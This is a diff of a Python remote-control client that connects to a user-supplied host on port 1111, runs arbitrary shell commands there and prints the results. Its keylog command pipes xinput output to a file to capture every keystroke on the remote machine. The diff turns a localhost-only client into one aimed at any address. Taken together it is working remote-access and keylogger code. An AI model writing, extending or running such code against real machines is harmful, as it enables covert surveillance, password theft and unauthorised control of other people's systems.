@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 # coding: utf-8
 
-# http://apprendre-python.com/page-reseaux-sockets-python-port
-import os
 import socket
 import pickle
 import shlex
@@ -24,9 +22,9 @@ class Client:
             "help": self.help,
         }
 
-        # print("enter the remote adress")
-        # address = input(">> ")  # utilisez raw_input() pour les anciennes versions python
-        self.address = "127.0.0.1"
+        print("enter the remote adress")
+        self.address = input(">> ")
+        #self.address = "127.0.0.1"
 
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((self.address, 1111))
@@ -50,6 +48,10 @@ class Client:
                 print("Error while doing the command " + args[0])
 
         print("bye")
+
+    # ...........
+    # Commands
+    # ...........
 
     def ls(self, args):
         """ args : void"""
@@ -100,21 +102,26 @@ class Client:
     def exec(self, args):
         """ args : 0 : command to execute """
         self.s.send(("exec:" + args[0]).encode())
+        r = self.s.recv(self.CHIFFRE)
+        print(r.decode())
 
     def keylog(self, args):
-        """" args : 0 : file to save strokes """
+        """ args : 0 : file to save strokes """
         command = ["xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test >> " + args[0]]
         self.exec(command)
 
     def exit(self, args):
+        """ args : void"""
         self.s.send(("exit:").encode())
         self.s.close()
 
     def help(self, args):
+        """ args : void """
         print("Available commands are : ")
         for key in self.commands.keys():
             print(key)
 
+    # Used to print server path in output
     def get_current_path(self):
         self.s.send("getpath:".encode())
         r = self.s.recv(self.CHIFFRE)
